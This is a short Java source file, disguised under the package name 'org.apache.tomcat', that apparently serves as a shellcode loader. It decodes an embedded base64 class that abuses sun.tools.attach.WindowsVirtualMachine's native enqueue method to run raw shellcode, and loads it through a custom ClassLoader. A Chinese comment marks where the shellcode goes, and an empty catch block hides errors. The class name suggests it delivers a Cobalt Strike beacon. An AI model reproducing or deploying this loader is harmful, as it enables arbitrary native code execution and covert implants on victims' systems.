package org.apache.tomcat;

import java.lang.reflect.Method;
import java.util.Base64;

public class ConnectCS implements Runnable {
    @Override
    public void run() {
        try {
            String classStr = "yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwAtAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAMAA0BAAZhdHRhY2gHAC4MAC8AMAEABHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0DAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAxAA0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UAIQALAAcAAAAAAAQAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAAbEAAAACAA8AAAAGAAEAAAAGABAAAAAMAAEAAAAFABEAEgAAAYgAEwAUAAEAFQAAAAQAAQAWAQgAFwAYAAEAFQAAAAQAAQAWAAkAGQAaAAEADgAAAHoABgACAAAAHRICuAADFAAEKhIGEgYDvQAHuAAIpwAITCu2AAqxAAEABQAUABcACQADAA8AAAAaAAYAAAANAAUADwAUABIAFwAQABgAEQAcABMAEAAAABYAAgAYAAQAGwAcAAEAAAAdAB0AHgAAAB8AAAAHAAJXBwAgBAABACEAAAACACI=";
            Class result = new ConnectCS.Myloader().get(Base64.getDecoder().decode(classStr));
            for (Method m : result.getDeclaredMethods()) {
                if (m.getName().equals("run")) {
                    // 这里替换shellcode
                    m.invoke(result, new byte[]{});
                }
            }
        } catch (Exception e) {

        }
    }

    public static class Myloader extends ClassLoader {
        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
}
